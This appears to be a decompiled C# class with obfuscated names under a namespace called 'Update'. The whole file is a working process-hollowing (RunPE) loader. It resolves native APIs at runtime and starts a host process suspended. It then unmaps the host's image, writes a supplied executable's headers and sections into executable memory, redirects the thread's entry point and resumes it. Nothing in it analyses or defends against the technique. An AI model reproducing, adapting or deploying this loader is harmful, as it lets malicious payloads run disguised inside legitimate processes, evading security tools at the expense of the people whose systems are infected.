using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Update;

public class GClass0
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate0(IntPtr intptr_0, uint[] uint_0);

	public delegate uint GDelegate1(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr bufr, int int_0, ref IntPtr intptr_2);

	public delegate uint GDelegate3(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate4(IntPtr intptr_0, uint[] uint_0);

	public delegate IntPtr GDelegate5(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool GDelegate6(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, int int_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcessW([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.Bool)] bool bool_0, int int_0, IntPtr intptr_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, byte[] byte_0, IntPtr[] intptr_3);

	public static int smethod_1(long long_0, long long_1 = 4L)
	{
		GDelegate2 gDelegate = smethod_0<GDelegate2>("ntdll", "NtReadVirtualMemory");
		IntPtr handle = Process.GetCurrentProcess().Handle;
		IntPtr intptr_ = (IntPtr)long_0;
		int int_ = checked((int)long_1);
		IntPtr intptr_2 = (IntPtr)0;
		IntPtr bufr = default(IntPtr);
		gDelegate(handle, intptr_, ref bufr, int_, ref intptr_2);
		_ = (int)intptr_2;
		return (int)bufr;
	}

	public static bool smethod_2(byte[] byte_0, string string_0)
	{
		checked
		{
			try
			{
				GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
				int num = (int)gCHandle.AddrOfPinnedObject();
				gCHandle.Free();
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] byte_ = new byte[68];
				int num2 = BitConverter.ToInt32(byte_0, 60);
				uint[] array2 = new uint[179];
				array2[0] = 65538u;
				string string_ = null;
				StringBuilder stringBuilder_ = new StringBuilder(string_0);
				string string_2 = null;
				CreateProcessW(ref string_, stringBuilder_, zero, zero, bool_0: false, 4, zero, ref string_2, byte_, array);
				int num3 = num + smethod_1(num + 60);
				int num4 = smethod_1(num3 + 52);
				GDelegate1 gDelegate = smethod_0<GDelegate1>("ntdll", "NtUnmapViewOfSection");
				gDelegate(array[0], (IntPtr)num4);
				GDelegate5 gDelegate2 = smethod_0<GDelegate5>("kernel32", "VirtualAllocEx");
				IntPtr intptr_ = gDelegate2(array[0], (IntPtr)num4, (IntPtr)smethod_1(num3 + 80), 12288, 64);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num2 + 52));
				IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(byte_0, num2 + 80));
				GDelegate6 gDelegate3 = smethod_0<GDelegate6>("ntdll", "NtWriteVirtualMemory");
				int int_ = default(int);
				gDelegate3(array[0], intptr_, byte_0, (uint)smethod_1(num3 + 84), int_);
				int num5 = smethod_1(num3 + 6, 2L) - 1;
				int num6 = 0;
				int int_2 = default(int);
				while (true)
				{
					int num7 = num6;
					int num8 = num5;
					if (num7 > num8)
					{
						break;
					}
					int[] array3 = new int[10];
					Buffer.BlockCopy(byte_0, num2 + 248 + num6 * 40, array3, 0, 40);
					byte[] array4 = new byte[array3[4] - 1 + 1];
					Buffer.BlockCopy(byte_0, array3[5], array4, 0, array4.Length);
					gDelegate3(intptr_1: new IntPtr(intptr_.ToInt32() + array3[3]), uint_0: (uint)(int)new IntPtr(array4.Length), intptr_0: array[0], byte_0: array4, int_0: int_2);
					num6++;
				}
				GDelegate0 gDelegate4 = smethod_0<GDelegate0>("ntdll", "NtGetContextThread");
				gDelegate4(array[1], array2);
				gDelegate3(array[0], (IntPtr)(unchecked((long)array2[41]) + 8L), BitConverter.GetBytes(intptr_.ToInt32()), 4u, int_2);
				array2[44] = (uint)(num4 + smethod_1(num3 + 40));
				GDelegate4 gDelegate5 = smethod_0<GDelegate4>("ntdll", "NtSetContextThread");
				gDelegate5(array[1], array2);
				GDelegate3 gDelegate6 = smethod_0<GDelegate3>("ntdll", "NtResumeThread");
				gDelegate6(array[1], (IntPtr)0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
